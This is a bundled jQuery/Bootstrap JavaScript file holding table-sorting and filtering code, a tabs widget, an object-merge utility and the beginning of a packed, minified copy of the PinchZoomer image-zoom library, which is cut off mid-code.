        setHeaderWidthAndHeight: function(){
            var _this   = this,
                options = _this.data(dataTableId);

            if (options.showHeader){
                this.$thead.find('th').each(function( index, th ){
                    _this.$theadClone.find('th:nth-child(' + (index+1) + ')')
                        .width( $(th).width()+'px' );
                });
                this.$tableWithHeader.width( this.width()+'px' );

                //Set the margin-top of the table to hide its own header
                var headerHeight = _this.$tableWithHeader.outerHeight();
                this.css('margin-top', -headerHeight + 'px');
            }
        },

        /**********************************************************
        sortBy - Sort the table
        **********************************************************/
        sortBy: function( idOrIndex, dir ){
            var column = this._getColumn(idOrIndex);
            if (column)
                column.$th.stupidsort( dir );
        },

        _resort: function(){
            this.sortBy( this.lastSortBy.columnIndex, this.lastSortBy.direction );
        },

        /**********************************************************
        beforeTableSort - Called before the table is being sorted by StupidTable
        **********************************************************/
        beforeTableSort: function(event, sortInfo){
            var column          = this._getColumn(sortInfo.column),
                sortMulticolumn = column.$th.attr('data-sort-multicolumn') || '';

            //Remove all group-header-rows
            this.find('.table-sort-group-header').remove();

            //Convert sortMulticolumn to array
            sortMulticolumn = sortMulticolumn ? sortMulticolumn.split(',') : [];
            sortMulticolumn.push(column.index);
        },

        /**********************************************************
        afterTableSort - Called after the table is being sorted by StupidTable
        **********************************************************/
        afterTableSort: function(event, sortInfo){
            this.lastSortBy = {
                    columnIndex: sortInfo.column,
                    direction  : sortInfo.direction
            };

            //Update the class-names of the cloned <thead>
            var cloneThList = this.$theadClone.find('th');
            this.find('thead th').each( function( index, th ){
                $(cloneThList[index])
                    .removeClass()
                    .addClass( $(th).attr('class') );
            });


            //Update all cells if column.options.updateAfterSorting == true
            var updateColumn = [],
                updateAnyColumn = false;

            $.each( this.columns, function( index, columnOptions ){
                updateColumn[index] = !!columnOptions.updateAfterSorting && !!columnOptions.createContent;
                updateAnyColumn = updateAnyColumn || updateColumn[index];
            });

            var _this = this;
            if (updateAnyColumn)
                this.eachRow( function(rowOptions){

                    $.each(updateColumn, function(columnIndex){
                        if (updateColumn[columnIndex]){
                            var $td = rowOptions.$tdList[columnIndex];
                            $td.empty();

                            _this._getColumn(columnIndex).createContent(
                                rowOptions.valueList[columnIndex],
                                $td,
                                _this.lastSortBy.columnIndex == columnIndex ? _this.lastSortBy.direction : false
                            );
                        }
                    });
                });

            var column = this._getColumn( sortInfo.column );

            //Marks first row of changed value
            if (column.sortHeader) {
                //$tdBase = a <td> as $-object acting as base for all tds in header-row
                var $tdBase =
                        $('<td/>')
                            .addClass('container-icon-and-text')
                            .attr('colspan', this.columns.length );
                column.$th.contents().clone().appendTo( $tdBase );
                $tdBase.append( $('<span>:</span>') );

                var lastHeaderContent = "Denne her text kommer sikkert ikke igen";

                this.find('tbody tr:not(.filter-out) td:nth-child(' + (sortInfo.column+1) +')').each( function( index, td ){
                    var $td = $(td),
                        nextHeaderContent = column.getSortContent ? $td.data('raw-value') : $td.data('sort-value');

                    if (column.getHeaderContent)
                        nextHeaderContent = column.getHeaderContent(nextHeaderContent);

                    if (!$._isEqual(nextHeaderContent, lastHeaderContent)){

                        //Create a clone of $tdBase and 'copy' all children from $td to $newTd
                        var $newTd = $tdBase.clone(true),
                            $span = $('<span/>').appendTo($newTd);

                        _this._createTdContent( nextHeaderContent, $span/*$newTd*/, column.index, column.createHeaderContent );

                        //Create new row and insert before current row
                        $('<tr/>')
                            .addClass('table-light table-sort-group-header')
                            .append( $newTd )
                            .insertBefore( $td.parent() );

                        lastHeaderContent = nextHeaderContent;
                    }
                });
            }

            //Re-calc and update width and height of headers
            this.setHeaderWidthAndHeight();

        },

        /**********************************************************
        resetFilterTable
        **********************************************************/
        resetFilterTable: function(dontSort){
            this.find('tbody tr').removeClass('filter-out');
            if (!dontSort)
                this._resort();
            this.setHeaderWidthAndHeight();
            return this;
        },

        /**********************************************************
        filterTable -
        **********************************************************/
        filterTable: function( rowF, columnF ){
            var _this = this,
                options = $(this).data(dataTableId),
                rowFilter = rowF || options.rowFilter,
                columnFilter = {};

            this.resetFilterTable(true);

            //Setting columnFilter = columnF OR columnOptions[].filter
            if (columnF)
                columnFilter = columnF;
            else
                $.each(this.columnIds, function(id, opt){
                    if (opt.filter)
                        columnFilter[id] = opt.filter;
                });


            this.eachRow( function( opt ){
                var result = true; //Included
                if (rowFilter)
                    //Row filter always before column-filter
                    result = rowFilter(opt.values, opt.id ); //<- HER: Måske nyt navn i stedet for values
                else {
                    $.each(columnFilter, function(id, filterFunc){
                        if (!filterFunc(opt.values[id], _this._getColumn(id))){ //<- HER: Måske nyt navn i stedet for values
                            result = false;
                            return false;
                        }
                    });
                }
                opt.$tr.toggleClass('filter-out', !result);
            });

            //Sort table again
            this._resort();

            this.setHeaderWidthAndHeight();

            return this;
        }
    }; //end of bsTable_prototype = {

    /**********************************************************
    bsTable( options ) - create a Bootstrap-table
    **********************************************************/
    var tableId    = 0,
        rowId      = 0,
        sortId     = 0;

    $.bsTable = function( options ){

        options = $._bsAdjustOptions( options, defaultOptions );
        options.class =
            'jb-table ' +
            (options.verticalBorder && !options.noBorder ? 'table-bordered ' : '' ) +
            (options.noBorder ? 'table-borderless ' : '' ) +
            (options.hoverRow ? 'table-hover ' : '' ) +
            (options.noPadding ? 'table-no-padding ' : '' ) +
            (options.notFullWidth ? 'table-not-full-width ' : '' ) +
            (options.centerInContainer ? 'mx-auto my-0 ' : '' ) +
            (options.selectable ? 'table-selectable ' : '' ) +
            (options.allowZeroSelected ? 'allow-zero-selected ' : '' );

        //Adjust each column
        var columnIds = {};

        $.each( options.columns, function( index, columnOptions ){
            columnOptions.sortable = columnOptions.sortable || columnOptions.sortBy;
            columnOptions = $.extend( true,
                {
                    index    : index,
                    sortIndex: (index+1)*100
                },
                defaultColunmOptions,
                options.defaultColunmOptions,
                columnOptions
            );

            columnIds[columnOptions.id] = columnOptions;
            options.columns[index] = columnOptions;

            //If column is sortable and sortBy is a function => add function to options.stupidtable
            if (columnOptions.sortable && $.isFunction(columnOptions.sortBy)){
                var stupidtableSortId = 'stupidtableSort'+ sortId++;
                options.stupidtable[stupidtableSortId] = columnOptions.sortBy;
                columnOptions.sortBy = stupidtableSortId;
            }
        });

        var id = 'bsTable'+ tableId++,
            $table = $('<table/>')
                        .addClass('BSTABLE')
                        ._bsAddBaseClassAndSize( options )
                        .attr({
                            'id': id
                        }),
            $thead = $('<thead/>')
                        .addClass('table-light')
                        .toggleClass('no-header', !options.showHeader )
                        .appendTo( $table ),
            $tr = $('<tr/>')
                    .appendTo( $thead );

        //Extend with prototype
        $table.init.prototype.extend( bsTable_prototype );

        $table.columns = options.columns;
        $table.columnIds = columnIds;

        //Create colgroup
        var $colgroup = $('<colgroup/>').appendTo($table);
        $.each( options.columns, function( index, columnOptions ){
            var $col = $('<col/>').appendTo( $colgroup );
            if (columnOptions.fixedWidth)
                $col.attr('width', '1');
        });

        var sortableTable  = false,
            sortDefaultId  = '',
            sortDefaultDir = 'asc',
            multiSortList  = [];

        $table.lastSortBy = {};

        /* From https://github.com/joequery/Stupid-Table-Plugin:
            "A multicolumn sort allows you to define secondary columns to sort by in the event of a tie with two elements in the sorted column.
                Specify a comma-separated list of th identifiers in a data-sort-multicolumn attribute on a <th> element..."

            multiSortList = []{columnIndex, sortIndex} sorted by sortIndex. Is used be each th to define alternative sort-order
        */
        $.each( options.columns, function( index, columnOptions ){
            if (columnOptions.sortable)
                multiSortList.push( {columnId: columnOptions.id, columnIndex: ''+index, sortIndex: columnOptions.sortIndex });
        });
        multiSortList.sort(function( c1, c2){ return c1.sortIndex - c2.sortIndex; });

        //Create headers
        if (options.showHeader)
            $.each( $table.columns, function( index, columnOptions ){
                columnOptions.$th = $('<th/>').appendTo( $tr );

                if (columnOptions.sortable){
                    columnOptions.$th
                        .addClass('sortable')
                        .attr('data-sort', columnOptions.sortBy);

                    if (columnOptions.sortDefault){
                        sortDefaultId  = columnOptions.id;
                        sortDefaultDir = columnOptions.sortDefault == 'desc' ? 'desc' : sortDefaultDir;
                    }

                    //Create alternative/secondary columns to sort by
                    var sortMulticolumn = '';
                    $.each( multiSortList, function( index, multiSort ){
                        if (multiSort.columnIndex != columnOptions.index)
                            sortMulticolumn = (sortMulticolumn ? sortMulticolumn + ',' : '') + multiSort.columnIndex;
                    });

                    if (sortMulticolumn){
                        /*
                        Bug fix in jquery-stupid-table
                        if sortMulticolumn == index for one column ("X") => data('sort-multicolumn') return an integer => error in jquery-stupid-table (split not a method for integer)
                        Solved by setting sortMulticolumn = "X,X" instead of X when only ons column is included
                        */
                        if (sortMulticolumn.indexOf(',') == -1)
                            sortMulticolumn = sortMulticolumn + ',' + sortMulticolumn;

                        columnOptions.$th.attr('data-sort-multicolumn', sortMulticolumn);
                    }
                    sortableTable = true;
                }


                adjustThOrTd( columnOptions.$th, columnOptions, true );

                columnOptions.$th._bsAddHtml( columnOptions.header );
            });

        if (options.selectable){
            var radioGroupOptions = $.extend( true, {}, options );
            radioGroupOptions.className = 'selected';
            options.radioGroup = $.radioGroup( radioGroupOptions );
        }

        $table.data(dataTableId, options);


        //Create tbody and all rows
        $table.append( $('<tbody/>') );

        $.each( options.content, function( index, rowContent ){
            $table.addRow( rowContent );
        });

        if (sortableTable){
            $table.stupidtable( options.stupidtable )
                .bind('beforetablesort', $.proxy( $table.beforeTableSort, $table ) )
                .bind('aftertablesort',  $.proxy( $table.afterTableSort,  $table ) );

            if (sortDefaultId, sortDefaultDir)
                $table.sortBy(sortDefaultId, sortDefaultDir);
        }

        return $table;
    };

}(jQuery, this.i18next, this, document));
;
/****************************************************************************
	jquery-bootstrap-tabs.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

    // Create $.BSASMODAL - See src/jquery-bootstrap.js for details
    $.BSASMODAL = $.BSASMODAL || {};


    $.BSASMODAL.BSTABS = function( options ){
        var $result =
                $.bsModal(
                    $.extend( {
                        flexWidth          : true,
                        noVerticalPadding  : true,
                        noHorizontalPadding: true,
                        scroll             : false,
                        content            : this._$contents,
                        fixedContent       : this._$tabs,
                    }, options)
               );

        //Save ref to the scrollBar containing the content and update scrollBar when tab are changed
        var $scrollBar = $result.data('bsModalDialog').bsModal.$content.parent();
        this._$tabs.find('a').on('shown.bs.tab', function() {
            $scrollBar.perfectScrollbar('update');
        });

        return $result;
    };


    /******************************************************
    bsTabs
<nav>
    <div class="nav nav-tabs" id="nav-tab" role="tablist">
        <a class="nav-item nav-link selected" id="nav-home-tab" data-bs-toggle="tab" href="#nav-home" role="tab" aria-controls="nav-home" aria-selected="true"><i class="fa fa-home"></i>&nbsp;<span>Home</span></a>
        <a class="nav-item nav-link" id="nav-profile-tab" data-bs-toggle="tab" href="#nav-profile" role="tab" aria-controls="nav-profile" aria-selected="false">Profile</a>
        <a class="nav-item nav-link" id="nav-contact-tab" data-bs-toggle="tab" href="#nav-contact" role="tab" aria-controls="nav-contact" aria-selected="false">Contact</a>
    </div>
</nav>
<div class="tab-content" id="nav-tabContent">
    <div class="tab-pane fade show selected" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">FIRST Sint sit mollit irure quis est nostrud cillum consequat Lorem esse do quis dolor esse fugiat sunt do. Eu ex commodo veniam Lorem aliquip laborum occaecat qui Lorem esse mollit dolore anim cupidatat. Deserunt officia id Lorem nostrud aute id commodo elit eiusmod enim irure amet eiusmod qui reprehenderit nostrud tempor. Fugiat ipsum excepteur in aliqua non et quis aliquip ad irure in labore cillum elit enim. Consequat aliquip incididunt ipsum et minim laborum laborum laborum et cillum labore. Deserunt adipisicing cillum id nulla minim nostrud labore eiusmod et amet. Laboris consequat consequat commodo non ut non aliquip reprehenderit nulla anim occaecat. Sunt sit ullamco reprehenderit irure ea ullamco Lorem aute nostrud magna.</div>
    <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">SECOND</div>
    <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">THIRD</div>
</div>
    ******************************************************/
    var tabsId = 0;
    $.bsTabs = function( options ){
        var $result = $('<div/>')
                        .addClass('BSTABS'),
            id = 'bsTabs'+ tabsId++,

            $tabs =
                $('<div/>')
                    ._bsAddBaseClassAndSize(
                        $._bsAdjustOptions( options, {}, {
                            baseClass   : 'nav',
                            styleClass  : '',
                            class       : 'nav-tabs' + (options.hideNotSelectedText ? ' hide-not-selected-text' : ''),
                            useTouchSize: true
                        })
                    )
                    .attr({'id': id, 'role': "tablist"})
                    .appendTo( $result ),

            $contents =
                $('<div/>')
                    ._bsAddBaseClassAndSize(
                        $._bsAdjustOptions( options, {}, {
                            baseClass   : 'tab-content',
                            styleClass  : '',
                            class       : '',
                            useTouchSize: false
                        })
                    )
                    .attr({'id': id+'content'})
                    .appendTo( $result );

        if (options.height)
            $contents.height( options.height );


        $.each( options.list, function( index, opt ){
            opt = $._bsAdjustOptions( opt );
            var tabId = options.id || id + 'tab' + index,
                contentId = tabId + 'content',
                //Create the tab
                $tab =
                    $('<a/>')
                        .addClass('nav-item nav-link')
                        .attr({
                            'id'            : tabId,
                            'role'          : 'tab',
                            'data-bs-toggle': "tab",
                            'data-user-id'  : opt.id || null,
                            'href'          : '#'+contentId,
                            'aria-controls' : contentId
                        })
                        ._bsAddHtml( opt.header || opt )
                        .appendTo( $tabs ),

                //Create the content-container = content + footer
                $container =
                    $('<div/>')
                        .addClass('tab-pane fade')
                        .attr({
                            'id'             : contentId,
                            'role'           : 'tabpanel',
                            'aria-labelledby': tabId
                        })
                        .appendTo( $contents ),

                $content =
                    $('<div/>')
                        .addClass('tab-inner-content')
                        .appendTo( $container );

            //Adding footer
            $('<div/>')
                .addClass('tab-footer')
                ._bsAddHtml( opt.footer )
                .appendTo( $container );

            if (opt.selected){
                $tab
                    .attr('aria-selected', true)
                    .addClass('active');
                $container.addClass('active show');
            }

            $content = options.scroll ? $content.addScrollbar('vertical') : $content;


            //Add content: string, element, function, setup-json-object, or children (=accordion)
            if (opt.content)
                $content._bsAppendContent( opt.content, opt.contentContext, null, options );

        });
        $result._$tabs = $tabs;
        $result._$contents = $contents;

        return $result;
    };

    //Extend $.fn with method to select a tab given by id (string) or index (integer)
    $.fn.bsSelectTab = function( indexOrId ){
        var $tab =
            $.type(indexOrId) == 'number' ?
            this.find('.nav-tabs a.nav-item:nth-of-type('+(indexOrId+1)+')') :
            this.find('.nav-tabs a.nav-item[data-user-id="' + indexOrId + '"]');

        if ($tab && $tab.length)
            $tab.tab('show');
    };


    /**********************************************************
    asModal - display the tabs in a modal-window with fixed header and scrolling content
    **********************************************************/
    $.BSASMODAL.BSTABS = function( modalOptions = {}){
        return $.bsModal(
                    $.extend( modalOptions, {
                        show        : false,
                        content     : this._$contents,
                        fixedContent: this._$tabs,
                        fixedContentOptions: {
                            noBottomPadding: true
                        }
                    })
                );
    };

}(jQuery, this, document));
;
/****************************************************************************
jquery-utilities.js

Utilities for manipulation JSON and other objects

****************************************************************************/

(function ($ /*, window, document, undefined*/) {
	"use strict";

    /******************************************
    $.mergeObjects(obj1, obj2)
    Merge obj2 into obj1. Return the merged version
    The merge is on all content of objects and tables
    *******************************************/
    $.mergeObjects = function mergeObjects(obj1, obj2){
        function objType( obj ){
            if ($.isArray(obj)) return 'array';
            if ($.isPlainObject(obj)) return 'object';
            if (obj === undefined)  return 'undefined';
            return 'simple';
        }
        function copyObj(obj){
            return $.extend(true, {}, obj);
        }

        var type1 = objType(obj1),
            type2 = objType(obj2),
            result;

        //If obj2 is undefined => No change
        if (type2 == 'undefined')
            return obj1;

        //If the two obj are different types or simple types: Can't merge => obj1 is replaced by obj2
        if ((type1 != type2) || (type2 == 'simple'))
            return obj2;

        if (type1 == 'array'){
            result = [...obj1];
            for (var i=0; i<obj2.length; i++){
                if (i < obj1.length)
                    result[i] = mergeObjects(obj1[i], obj2[i]);
                else
                    result.push( copyObj(obj2[i]) );
            }
        }

        if (type1 == 'object'){
            result = copyObj(obj1);
            $.each(obj2, function(id, value){
                result[id] = mergeObjects(obj1[id], value);
            });
        }

        return result;
    };

}(jQuery, this, document));
;
/****************************************************************************
jquery.pinchzoomer.js

This is a copy of a license version of PinchZoomer

****************************************************************************/

/*!
 * VERSION: 2.4
 * DATE: 08-12-2020
 *
 * PinchZoomer (minified)
 *
 * @license Copyright (c) 2018, Ron Feliciano. All rights reserved.
 * This work is subject to the terms at http://codecanyon.net/licenses
 *
 * @author: Ron Feliciano
 * contact me through http://codecanyon.net/user/ronfeliciano/?ref=ronfeliciano
 **/

var _0x2132=['(3(H,g){3 a(){}a.3A=3(){4 c=26.5H,n=c.6J(/(86|7q|7o|7n|7l|5P(?=\\/))\\/?\\s*([\\d\\.]+)/i)||[];o(/5P/i.7s(n[1])){4 d=/\\7k[ :]+(\\d+(\\.\\d+)?)/g.7j(c)||[];12{1k:"7i",4p:d[1]||""}}n=n[2]?[n[1],n[2]]:[26.7h,26.7f,"-?"];7!=(d=c.6J(/4p\\/([\\.\\d]+)/i))&&(n[2]=d[1]);12 2<n.8?{1k:n[0],4p:n[2]}:{1k:n[0],4p:n[1]}}();a.4D=3(c){4 n=c;18 0!==c&&(1f(68(c))?18 0===c.4l||"6b"!=c.4l()&&"7u"!=c.4l()?(c=g.4e(c),2<=c.8&&"\'"==c.2h(0)&&"\'"==c.2h(c.8-1)&&(n=c=c.4O(1,c.8-2))):n="6b"==c.4l():n=68(c));12 n};a.6W=3(c){12 c.7T(/-([a-z])/7V,3(n,d){12 d.7W()})};a.1o=3(c){c.1o?c.1o():c.7t=!1};a.7Y=3(c){18 0!==c&&18 0!=c.5E&&c.5E.1o()};a.4v=3(c,n){19(4 d=[],h=0,k=0,l=0,u=0,v="",z=0;z<c.8;z++){4 F=c.2h(z);"{"==F?h++:"}"==F?k++:"["==F?l++:"]"==F&&u++;h==k&&l==u?F!=n?v+=F:(d.29(v),v=""):v+=F}""!=v&&d.29(v);12 d};a.1w=3(c){c=g.4e(c);4 n=c.8;o(1<n)o("["==c.2h(0)&&"]"==c.2h(n-1)){c=c.4O(1,c.8-2);n=[];4 d=a.4v(c,",");19(c=0;c<d.8;c++){4 h=g.4e(d[c]);n.29(a.1w(h))}c=n}1j o("{"==c.2h(0)&&"}"==c.2h(n-1)){c=c.4O(1,c.8-2);n={};d=a.4v(c,";");19(c=0;c<d.8;c++){h=d[c].5W(":");4 k="";4 l=a.6W(g.4e(h[0]));2==h.8?k=a.1w(h[1]):2<h.8&&(h.2W(0,1),k=a.1w(h.5U(":")));""!=l&&(n[l]=k)}c=n}1j c=a.4D(c);1j c=a.4D(c);12 c};a.7z=3(c){19(4 n=c.8,d,h;0!==n;)h=1V.7A(1V.7B()*n),--n,d=c[n],c[n]=c[h],c[h]=d;12 c};a.2L=3(c,n){n.3c=6p.6q?6p.6q(c.3c):a.6s(c.3c);12 n.3c};a.6s=3(c){3 n(){}n.3c=c;12 1M n};a.7F=3(){12"7y"3v H||0<26.7x||0<26.55};a.4j=1;a.7D=3(c,n){n?4F.4C(a.4j+": "+c):g("#82").5A(a.4j+":&7Z;"+c+"<7S>");a.4j++};a.6R=3(c,n){n=n||{};n.5h=7!=n.5h?n.5h:"1J-7r";o(7!=g.4r.1J){4 d=c?g(c).2A("*[j-2c]").4b(".2p"):g("*[j-2c]").4b(".2p"),h=d.8,k=0,l={};"4U"==a.3A.1k?l.3C="5G":(l.3C="6V",l.6Y={3D:!0},l.7b={3B:!0});l=g.1K({},l,n);19(k=0;k<h;k++){4 u=d.1n(k),v=g.1K({},l,a.1w("{"+u.j("2c-2l")+"}"));u.30("7P",u.j("2c"));u.1J(v);(1M 3w(u.3r(0))).1c("3O 6M",3(z){4 F=g(z.13).4z(".2p");0<F.8&&("3O"==z.14?F.1J("6B"):F.1J("5i"))})}d=c?g(c).2A("*[j-2c-5m]").4b(".2p"):g("*[j-2c-5m]").4b(".2p");l={7O:!0};"4U"==a.3A.1k?l.3C="5G":(l.3C="6V",l.6Y={3D:!0},l.7b={3B:!0});l=g.1K({},l,n);h=d.8;19(k=0;k<h;k++)u=d.1n(k),v=g.1K({},l,a.1w("{"+d.j("2c-2l")+"}")),u.30("j-2c-7w",u.30("j-2c-5m")),u.1J(v),(1M 3w(u.3r(0))).1c("3O 6M",3(z){0<g(z.13).4z(".2p").8&&("3O"==z.14?g(z.13).1J("6B"):g(z.13).1J("5i"))})}};a.51=3(c){7!=g.4r.1J&&g(c||".2p").1J("5i")};a.4P=3(c){7!=g.4r.1J&&g(c||".2p").1J("7g")};H.1e=a})(2j,1x);(3(H,g){4 a=3(){};a.16=".2a";a.3M="6g"+a.16;a.4B="7K"+a.16;a.1H={2E:g("<1U 4f=\'4s:7J; 32:1I; 36:1I; 4w:1I; 4x:1I; 28:3S; z-7I:7H\'></1U>"),2u:g("<1U></1U>"),2F:"2E",1L:!1,4J:g("4E").2P("28"),4M:0,4I:0};a.2t=7;a.1L=3(c){12 g.3k(a.1H.2E[0],c[0])};a.7G=3(c){a.1t(!a.1H.1L,c)};a.1t=3(c,n){4 d=a.1H;o("3f"===1x.14(c)){4 h=a.2t,k=g(n),l=g("4E"),u=g(H),v=d.1L,z=d.2E;c&&v&&!h.20(k)?(h.6v(d.2F),d.2u.3K(h),d.2u.3a(),k.3K(d.2u),k.6E(d.2F),z.1p(k),a.2t=k,d.1L=!0,g(a).17({14:a.3M,13:a})):c!=v&&(c?7==h&&0<k.8?(l.1p(z),d.4J=l.2P("28"),d.4M=u.49(),d.4I=u.2U(),l.2P("28","2M"),k.3K(d.2u),k.6E(d.2F),z.1p(k),a.2t=k,d.1L=!0,g(a).17({14:a.3M,13:a})):4F.4C("7E 20 7C 7v 72 3v 1t 70 11 6Z 20 6i."):7!=h&&h.20(k)?(k.6v(d.2F),d.2u.3K(k),d.2u.3a(),d.2E.3a(),l.2P("28",d.4J),u.49(d.4M),u.2U(d.4I),a.2t=7,d.1L=!1,g(a).17({14:a.3M,13:a})):4F.4C("7L 7M 7X 84 20 6w 83 72 3v 1t 70 11 6Z 20 6i"))}12 d.1L};g(7d).81(3(c){27==c.80&&7!=a.2t&&(c=a.2t,a.1t(!1,a.2t),g(a).17({14:a.4B,13:a,11:c}))});H.2a=a})(2j,1x);(3(H,g){H.37=3(){4 a=1m,c=g(a);a.1H={};a.1d=3(n){18 0!==n&&g.1K(a.1H,n);12 a.1H};a.1c=3(){c.1c.2n(c,2k)};a.24=3(){c.24.2n(c,2k)};a.1g=3(){c.1g.2n(c,2k)};a.j=3(){12 c.j.2n(c,2k)}}})(2j,1x);(3(H,g){4 a=3(n,d){c.2i(1m);4 h=1m,k=7,l=h.1H;4 u=h.1d;h.1d=3(v,z){18 0!==v&&(u.2i(h,v),h.1W());12 l};h.11=3(v){18 0!==v&&(7!=k&&k.j("3G",7),k=7,k=g(v),k.j("3G",h),g(h).17({14:a.2w,13:h}),h.1W());12 k};h.6g=3(){l.2D=!l.2D;h.1W()};h.4c=3(v,z){18 0==v||v==l.2D&&!z||(l.2D=v,h.1W());12 l.2D};h.1W=3(){7!=k&&(1a.1E(k,l.1v,l.2D?l.59:l.56),g(h).17({14:a.3j,13:h}))};h.1d(g.1K({2D:!0,1v:0,59:{2R:1,1T:!0},56:{2R:.5,1T:!0}},d));h.11(n)},c=37;1e.2L(c,a).3u=a;a.16=".7R";a.3j="1W"+a.16;a.2w="5l"+a.16;H.4i=a})(2j,1x);(3(H,g){4 a=3(n,d){3 h(q){q=u(q.13);o(-1!=q){4 t=w[q],G=t.j("3m");o(t.j("1G"))t.1i("23"),t.1i("2S"),t.1i("3m"),t.1i("1G"),t.1i("3l");1j{4 L=t.j("23");G[0].4f.6t="23("+L+")";t.1Y()}w.2W(q,1);z();1C||p.1P()}}3 k(q){q=u(q.13);o(-1!=q){4 t=w[q],G=t.j("3l"),L=t.j("23");P.6y&&""!=G&&G!=L?t.1g("1P",h).1g("3N",k).24("1P",h).24("3N",l).30("1Z",G):(t.j("1G")?(t.1i("23"),t.1i("2S"),t.1i("3m"),t.1i("1G"),t.1i("3l")):t.1Y(),w.2W(q,1),z(),1C||p.1P())}}3 l(q){q=u(q.13);o(-1!=q){4 t=w[q],G=t.j("1G");t.1i("23");t.1i("2S");t.1i("3m");t.1i("1G");t.1i("3l");G||t.1Y();w.2W(q,1);z();1C||p.1P()}}3 u(q){4 t=-1;q=g(q);19(4 G=w.8,L=0;L<G;L++){4 x=w[L];q.3r(0)==x.3r(0)&&(t=L,L=G)}12 t}3 v(q,t){a.4R=!1;a.6L();q=g(q);4 G=F(q);7!=G&&(t?w.29(G):w.5Y(G));G=q.2A("*[j-1Z]");19(4 L=G.8,x=0;x<L;x++){4 I=F(G.1n(x));7!=I&&(t?w.29(I):w.5Y(I))}}3 z(){V.17({14:a.6K,13:p});7!=w&&0==w.8&&V.17({14:a.2V,13:p})}3 F(q){4 t=7;o(7!=q.j("1Z")&&""!=q.j("1Z")){4 G=q.20("1G");q.2P("4t-1G");4 L="3f"===g.14(q.j("3H"))?q.j("3H"):P.3H,x="",I="",E=1e.1w(q.j("1Z")),1z=!1;g.6C(E)?0<E.8?(L=0,0<=a.1Q&&a.1Q<E.8&&(L=a.1Q),x=E[L],0!=L&&(I=E[0]),"6x"!=1x.14(x)&&(1z=!0)):1z=!0:L?("1k"==P.6k?(x=E.5W("."),5y=x.7Q(),5Z=x.5U("."),x=5Z+"7N"+a.21[a.1Q].1k+"."+5y):(x=E.65(0,E.6a("/")),I=E.65(E.6a("/")+1,E.8),x=""!=x?x+"/"+a.21[a.1Q].1k+"/"+I:a.21[a.1Q].1k+"/"+I),I=E):x=q.j("1Z");1z||(q.4o("j-1Z"),q.1i("1Z"),G?(t=q,t.4o("1Z")):t=g("<1G/>"),t.j("23",x),t.j("2S",!1),t.j("3m",q),t.j("1G",G),t.j("3l",I))}12 t}c.2i(1m);4 p=1m,V=g(p),w=[],P=p.1H,1C=!0;p.1p=3(q){18 0!==q&&v(q,!0)};p.5A=3(q){18 0!==q&&v(q,!1)};p.6z=3(){w=[];1C=!0};p.1P=3(){1C=!1;19(4 q=w.8,t=0;t<P.4Q;t++)o(t<q){4 G=w[t];G.j("2S")||(G.j("2S",!0),G.1g("1P",h).1g("3N",k).24("1P",h).24("3N",k).30("1Z",G.j("23")))}1j t=P.4Q;0==q&&z()};p.7m=3(){};p.1d(g.1K({},{6y:!1,6k:"7p",3H:!1,4Q:6},d));p.1p(n)},c=37;1e.2L(c,a).3u=a;a.16=".2d";a.2V="5I"+a.16;a.6K="85"+a.16;a.21=[{1k:"7U",2g:87},{1k:"8l",2g:8W},{1k:"91",2g:95}];a.4R=!0;a.1Q=-1;a.6o=3(){a.21.96(3(n,d){12 6F(n.2g)-6F(d.2g)})};a.67=3(n){o(a.4R&&g.6C(n)&&0<n.8){19(4 d=!0,h=n.8,k=0;k<h;k++){4 l=n[k];o(7==l.1k||7==l.2g||"6x"!==93 l.1k||1f(l.2g))d=!1,k=h}d&&(a.21=7,a.21=n,a.6o())}};a.6L=3(){o(0>a.1Q)o(7!=H.4S){4 n=1V.8U(4S.2X,4S.2H);a.1Q=0;19(4 d=a.21.8-1;0<=d;d--)n>=a.21[d].2g&&(a.1Q=d,d=-1)}1j a.1Q=0};H.2d=a})(2j,1x);(3(H,g){4 a=3(n,d){3 h(w){p=z>=v.2m&&z<=v.1O;7==u||F==p&&!w||(1a.1u(u,p?{2R:1}:{2R:0}),F=p,l.17({14:a.3j,13:k}))}c.2i(1m,n,d);4 k=1m,l=g(k),u=7,v=k.1H,z=1,F=!1,p=!0;4 V=k.1d;k.1d=3(w,P){18 0!==w&&(V.2i(k,w),P&&k.1W());12 v};k.11=3(w){18 0!==w&&(7!=u&&u.j("3G",7),u=7,u=g(w),u.j("3G",k),l.17({14:a.2w,13:k}),k.1W());12 u};k.1W=3(){o(7!=u){4 w=(p=z>=v.2m&&z<=v.1O)?{2R:1}:{2R:0};w.x=v.x;w.y=v.y;w.1A=v.1A;w.1T=!0===v.1T;w.4Z="2M";v.4T||(w.3d=1);1a.1u(u,w);l.17({14:a.3j,13:k})}};k.1h=3(w,P,1C,q){7!=u&&18 0!==w&&(P=P||1,z=v.74?w*P:w,v.4T&&1a.1E(u,q||0,{3d:1/(w*P)}),h());12 z};k.1d(g.1K({x:0,y:0,1A:"50% 50%",2m:0,1O:8S,4T:!0,74:!1,1T:!1},d));k.11(n);h(!0)},c=37;1e.2L(c,a).3u=a;a.16=".5F";a.3j="1W"+a.16;a.2w="5l"+a.16;H.5a=a})(2j,1x);(3(H,g){4 a=3(n,d,h,k){3 l(){7!=2b&&(2b.8R(!0),2b.8Q(),2b=7)}3 u(){7==D||e.34||(p(),2b=1M 3w.8P(D[0],{7c:42?3e:"8O"}),2b.5K(1M 3w.8K({8I:"69",8H:2})),2b.1c("98.6r",P),2b.1c("69",V))}3 v(){7==D||e.34||(D.1g("3D",1z),O.1g("5V",52),O.1g("3B",54),1a.1u(D,{78:"8G"}),e.31&&(D.1c("3D",1z),O.1c("5V",52),O.1c("3B",54),1a.1u(D,{78:"1h-3v"})))}3 z(b){e.4a&&(b=g(b.13),f.4a(b))}3 F(b){42&&b!=3V&&(3V=b,7!=D&&1a.1u(D,{7c:3V}))}3 p(){42&&(3e=A>f.1b||Q>J||R>K||e.2r&&e.2s?"5o":e.2r?"2Z-y":e.2s?"2Z-x":"2Z-x 2Z-y")}3 V(b){o(Z&&!1X){4 m=1s,r=!1;m>=e.3y||m>=e.1O?(m=e.2m,r=!0):m=e.3y;4 